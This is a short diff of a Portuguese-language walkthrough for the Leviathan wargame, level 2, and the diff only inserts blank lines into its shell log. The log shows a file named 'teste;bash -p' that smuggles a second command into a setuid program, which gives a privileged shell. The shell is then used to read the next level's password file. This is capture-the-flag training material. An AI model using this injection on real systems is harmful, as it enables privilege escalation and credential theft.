@@ -206,8 +206,11 @@ Opa! ele chama /bin/cat e isso é maravilhoso! Porque ?
 Bem... o cat funciona de um jeito diferente ele permite ler dois arquivos de uma vez.
 
 >leviathan2@leviathan:~$ touch "teste;bash -p"
+
 >leviathan2@leviathan:~$ cd /tmp
+
 >leviathan2@leviathan:/tmp$ /home/leviathan2/printfile "teste;bash -p"
+
 >leviathan3@leviathan:/tmp$   
 
 >leviathan3@leviathan:/tmp$ cat /etc/leviathan_pass/leviathan3
